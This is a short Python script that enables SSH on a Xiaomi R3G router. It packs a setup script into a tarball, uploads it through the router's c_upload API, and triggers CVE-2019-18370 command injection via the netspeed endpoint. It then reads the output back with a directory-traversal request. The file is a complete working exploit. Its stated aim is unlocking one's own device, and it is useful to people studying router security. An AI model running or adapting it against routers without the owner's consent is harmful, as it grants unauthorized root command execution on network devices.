#!/usr/bin/python
# This script enables ssh on a Xiaomi R3G Router (without the need of a miwifi_ssh.bin)
# Chmod or run with a REPL e.g. `python3 install.py`
# Make sure you install the imports below e.g. `pip install requests`
import os
import tarfile
import requests

# proxies = {"http":"http://127.0.0.1:8080"}
proxies = {}

print("IMPORTANT: If you want key-based auth, make sure you have created a public 'id_rsa.pub', put it in 'bootstrap/' and uncommented necessary lines in 'setup.sh'\n---\n")
stok = input("Log into http://192.168.31.1/cgi-bin/luci/web\n\nEnter STOK variable (not with '/...'): ")

with tarfile.open("payload.tar.gz", "w:gz") as tar:
    if os.path.isfile("bootstrap/id_rsa.pub"):
        tar.add("bootstrap/id_rsa.pub", arcname="id_rsa.pub")
    tar.add("bootstrap/setup.sh", arcname="setup.sh")
    tar.add("bootstrap/speedtest_urls.xml", arcname="speedtest_urls.xml")

print("Uploading Setup")
r1 = requests.post("http://192.168.31.1/cgi-bin/luci/;stok={}/api/misystem/c_upload".format(stok), files={"image":open("payload.tar.gz",'rb')}, proxies=proxies)

os.remove("payload.tar.gz")

print("Executing CVE-2019-18370")
r2 = requests.get("http://192.168.31.1/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed".format(stok), proxies=proxies)

print("Fetching Setup Output")
r3 = requests.get("http://192.168.31.1/api-third-party/download/extdisks../tmp/out.txt", proxies=proxies)
if r3.status_code == 200:
    print("--- Router Output ---")
    print(r3.text)
    print("--- Router Output End ---\n\n:thumbsup:")
